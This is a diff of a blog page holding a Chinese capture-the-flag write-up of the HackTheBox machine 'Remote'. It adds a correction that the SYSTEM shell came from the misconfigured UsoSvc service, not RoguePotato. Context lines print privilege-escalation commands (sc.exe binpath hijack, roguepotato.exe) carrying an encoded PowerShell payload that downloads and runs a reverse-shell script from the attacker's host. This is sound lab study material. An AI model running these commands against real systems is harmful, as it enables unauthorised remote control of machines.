@@ -53,12 +53,13 @@
 <meta property="og:image" content="http://evilarsene.icu/images/Remote/23.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Remote/24.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Remote/25.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/30.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Remote/26.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Remote/27.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Remote/28.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Remote/29.png">
 <meta property="article:published_time" content="2020-10-28T06:16:26.000Z">
-<meta property="article:modified_time" content="2021-06-06T04:00:52.338Z">
+<meta property="article:modified_time" content="2021-06-23T09:12:09.738Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Windows靶机">
 <meta name="twitter:card" content="summary">
@@ -252,7 +253,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-06 12:00:52" itemprop="dateModified" datetime="2021-06-06T12:00:52+08:00">2021-06-06</time>
+                <time title="修改时间：2021-06-23 17:12:09" itemprop="dateModified" datetime="2021-06-23T17:12:09+08:00">2021-06-23</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -345,11 +346,16 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config UsoSvc binpath&#x3D; &quot;cmd &#x2F;c powershell -EncodedCommand aQBlAHgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgA5ADgALwB3AGkAbgBwAHIAaQB2AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA&#x3D;&quot;</span><br><span class="line">net start UsoSvc</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/Remote/24.png" alt="24"></p>
-<h3 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h3><p>考虑到目标版本比较新，使用roguepotato</p>
+<h3 id="SeImpersonatePrivilege-错误示范"><a href="#SeImpersonatePrivilege-错误示范" class="headerlink" title="SeImpersonatePrivilege(错误示范)"></a>SeImpersonatePrivilege(错误示范)</h3><p>考虑到目标版本比较新，使用roguepotato</p>
 <p>这里需要指定CLSID，目标是<code>Windows Server 2019 Standard</code>，但是<code>Windows_10_Pro</code>和<code>Windows_10_Enterprise</code>某些CLSID仍然可用</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\roguepotato.exe -r 10.10.16.98 -c &quot;&#123;B91D5831-B1BD-4608-8198-D72E155020F7&#125;&quot; -e &quot;cmd &#x2F;c powershell -EncodedCommand aQBlAHgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgA5ADgALwB3AGkAbgBwAHIAaQB2AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA&#x3D;&quot; -l 9999</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/Remote/25.png" alt="25"></p>
+<p>*在某一天，我阅读了RoguePotato的一些原理:<a target="_blank" rel="noopener" href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/">链接</a></p>
+<p>我意识到Ippsec这里的调用存在错误，并且通过0xdf的一篇<a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html">文章</a></p>
+<p><img src="/images/Remote/30.png" alt="30"></p>
+<p><code>RoguePotato</code>这里并没有调用成功，而是调用的CLSID正是错误配置的服务<code>UsoSvc</code>。巧了，该服务顺利给我们一个SYSTEM Shell😮</p>
+<p>感谢<code>0xdf</code>😊</p>
 <h3 id="CVE-2019-18988"><a href="#CVE-2019-18988" class="headerlink" title="CVE-2019-18988"></a>CVE-2019-18988</h3><p>进程找到TeamViewer7</p>
 <p><img src="/images/Remote/26.png" alt="26"></p>
 <p>枚举版本</p>
@@ -445,7 +451,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Remote"><span class="nav-number">1.</span> <span class="nav-text">Remote</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text">枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-Service-Properties"><span class="nav-number">1.3.1.</span> <span class="nav-text">Insecure Service Properties</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SeImpersonatePrivilege"><span class="nav-number">1.3.2.</span> <span class="nav-text">SeImpersonatePrivilege</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2019-18988"><span class="nav-number">1.3.3.</span> <span class="nav-text">CVE-2019-18988</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Remote"><span class="nav-number">1.</span> <span class="nav-text">Remote</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text">枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-Service-Properties"><span class="nav-number">1.3.1.</span> <span class="nav-text">Insecure Service Properties</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SeImpersonatePrivilege-%E9%94%99%E8%AF%AF%E7%A4%BA%E8%8C%83"><span class="nav-number">1.3.2.</span> <span class="nav-text">SeImpersonatePrivilege(错误示范)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2019-18988"><span class="nav-number">1.3.3.</span> <span class="nav-text">CVE-2019-18988</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -461,14 +467,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">169</span>
+          <span class="site-state-item-count">170</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
